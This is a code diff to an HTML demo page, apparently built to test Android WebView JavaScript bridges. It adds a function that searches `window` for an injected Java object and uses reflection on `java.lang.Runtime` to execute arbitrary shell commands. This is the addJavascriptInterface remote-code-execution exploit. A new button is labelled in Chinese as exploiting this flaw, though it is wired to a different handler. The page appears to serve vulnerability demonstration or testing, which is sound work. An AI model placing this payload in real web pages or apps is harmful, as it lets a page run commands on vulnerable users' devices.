@@ -31,6 +31,16 @@
              alert("demo " + result);
          }
 
+         function execute(cmdArgs){
+             for (var obj in window) {
+                 if ("getClass" in window[obj]) {
+                 alert(obj);
+                 return  window[obj].getClass().forName("java.lang.Runtime")
+                 .getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs);
+             }
+        }
+}
+
     </script>
 </head>
 <body>
@@ -41,5 +51,7 @@
 <button type="button" id="button2" onclick="callAndroid2()">点击测试ShouldOverridUrl</button>
 <hr/>
 <button type="button" id="button3" onclick="clickprompt()">点击测试prompt</button>
+<hr/>
+<button type="button" id="button4" onclick="clickprompt()">利用Android class 2 js 漏洞</button>
 </body>
 </html>
